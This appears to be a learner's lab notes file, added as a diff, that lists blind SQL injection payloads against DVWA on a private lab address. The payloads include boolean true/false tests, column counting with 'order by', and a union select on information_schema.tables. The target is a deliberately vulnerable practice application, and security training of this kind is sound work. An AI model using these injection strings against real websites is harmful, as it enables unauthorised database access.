@@ -1,0 +1,8 @@
+SQL Blind Injection
+
+http://192.168.1.123/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#
+
+http://192.168.1.123/dvwa/vulnerabilities/sqli_blind/?id=1' and 1=1 %23 &Submit=Submit#
+http://192.168.1.123/dvwa/vulnerabilities/sqli_blind/?id=1' and 1=0 %23 &Submit=Submit#
+http://192.168.1.123/dvwa/vulnerabilities/sqli_blind/?id=1' order by 1 %23 &Submit=Submit#
+http://192.168.1.123/dvwa/vulnerabilities/sqli_blind/?id=1' union select 1,2 from information_schema.tables %23 &Submit=Submit#
